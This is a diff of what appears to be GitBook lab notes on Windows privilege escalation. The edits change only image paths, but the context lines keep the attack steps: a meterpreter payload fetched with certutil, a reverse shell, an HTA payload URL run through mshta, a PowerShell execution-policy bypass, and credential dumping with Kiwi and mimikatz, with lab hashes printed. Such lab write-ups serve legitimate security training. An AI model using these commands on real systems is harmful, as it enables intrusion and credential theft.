@@ -10,33 +10,33 @@
 
 * On the Attacker machine check the current user
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
 * From the Kali machine, generate a `meterpreter` x64 payload
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Set up a web server to host the payload
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Download the payload file on the target system using the `certutil` tool in `cmd`
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Stop the http server and start `msfconsole` on the Kali machine
 * Execute the `payload.exe` on the Win target system and check the reverse shell on Kali
 
-<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Manually search for the **`unattend.xml`** file, it should be inside
   * `C:\\Windows\\Panther`
 
-<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * In a new terminal tab
 
@@ -44,7 +44,7 @@
 cat unattend.xml
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Get Access
 
@@ -53,7 +53,7 @@ cat unattend.xml
 * Save it to a new file
 * Decode it using the `base64` tool
 
-<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Test the `administrator`:`Admin@123root` credentials with the `psexec` tool
 
@@ -61,11 +61,11 @@ cat unattend.xml
 psexec.py administrator@10.0.17.233
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
 
-<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Run the `powerup.ps1` Powershell script to find privilege escalation vulnerability on target machine powershell.
 
@@ -74,7 +74,7 @@ cd .\Desktop\PowerSploit\Privesc\
 ls
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Import `PowerUp.ps1` script and Invoke-PrivescAudit function.
 
@@ -84,7 +84,7 @@ powershell -ep bypass (PowerShell execution policy bypass)
 Invoke-PrivescAudit
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Cat out the file
 * Decoding administrator password using Powershell.
@@ -96,7 +96,7 @@ ssword))
 echo $password
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Run a command prompt as an administrator user using discover credentials.
 
@@ -106,7 +106,7 @@ Admin@123
 whoami
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (17) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -118,11 +118,11 @@ exploit
 
 > “This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell..”
 
-<figure><img src="../../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Copy the generated payload i.e `“http://10.10.21.2:8080/upJ4YOZ3WBfCD.hta”` and run it on `cmd.exe` with mshta command to gain the meterpreter shell.
 
-<figure><img src="../../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 sessions -i 1
@@ -177,7 +177,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -222,9 +222,9 @@ meterpreter > getuid
 meterpreter > migrate -N lsass.exe
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Hash Dumping - Kiwi <a href="#hash-dumping-kiwi" id="hash-dumping-kiwi"></a>
 
@@ -233,9 +233,9 @@ load kiwi
 ?
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Retrieve all credentials
 
@@ -243,7 +243,7 @@ load kiwi
 meterpreter > creds_all
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 Administrator User NTLM Hash: `e3c61a68f1b89ee6c8ba9507378dc88d`
@@ -255,7 +255,7 @@ Administrator User NTLM Hash: `e3c61a68f1b89ee6c8ba9507378dc88d`
 meterpreter > lsa_dump_sam
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 Student User NTLM Hash: `bd4ca1fbe028f3c5066467a7f6a73b0b`
@@ -267,7 +267,7 @@ Student User NTLM Hash: `bd4ca1fbe028f3c5066467a7f6a73b0b`
 meterpreter > lsa_dump_secrets 
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 Syskey: `377af0de68bdc918d22c57a263d38326`
@@ -283,11 +283,11 @@ meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 meterpreter > shell
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Run `mimikatz.exe`
 
-<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Dump the cache of the `lsass` process
 
@@ -295,15 +295,15 @@ meterpreter > shell
 mimikatz # lsadump::sam
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 mimikatz # lsadump::secrets
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Display logon passwords, when stored in clear-text
   * in this case clear-text password are disabled - `(null)`
@@ -312,7 +312,7 @@ mimikatz # lsadump::secrets
 mimikatz # sekurlsa::logonPasswords
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
